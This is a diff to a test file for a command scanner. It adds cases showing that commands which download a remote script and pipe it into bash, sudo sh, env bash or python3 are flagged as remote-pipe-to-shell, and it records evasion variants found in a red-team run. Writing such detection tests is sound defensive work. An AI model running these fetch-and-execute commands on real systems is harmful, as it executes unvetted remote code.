@@ -64,6 +64,26 @@ test("remote-pipe-to-shell: wget piped into sudo sh fires", () => {
   assert.ok(findings.some((f) => f.category === "remote-pipe-to-shell"));
 });
 
+// Red-team run 2026-11-12: a shell named by full path, sudo with flags, or env
+// in front of it read as "not a shell", so these all passed clean.
+for (const cmd of [
+  "curl -fsSL https://example.com/i.sh | /bin/bash",
+  "curl -fsSL https://example.com/i.sh | sudo -E bash",
+  "curl -fsSL https://example.com/i.sh | /usr/bin/sudo -u app /bin/sh",
+  "wget -qO- https://example.com/i.sh | /usr/bin/env bash",
+  "curl -fsSL https://example.com/i.py | env python3",
+]) {
+  test(`remote-pipe-to-shell: fires on ${cmd.split("| ")[1]}`, () => {
+    assert.ok(scanCommand(cmd).some((f) => f.category === "remote-pipe-to-shell"), cmd);
+  });
+}
+
+test("remote-pipe-to-shell: a file whose name ends in sh is not a shell", () => {
+  for (const cmd of ["curl -fsSL https://example.com/i | tee /tmp/sh", "curl -fsSL https://example.com/i | shasum -a 256"]) {
+    assert.ok(!scanCommand(cmd).some((f) => f.category === "remote-pipe-to-shell"), cmd);
+  }
+});
+
 test("remote-pipe-to-shell: curl piped into a file, not a shell, does not fire", () => {
   const findings = scanCommand("curl -fsSL https://example.com/install.sh | tee install.sh");
   assert.ok(!findings.some((f) => f.category === "remote-pipe-to-shell"));
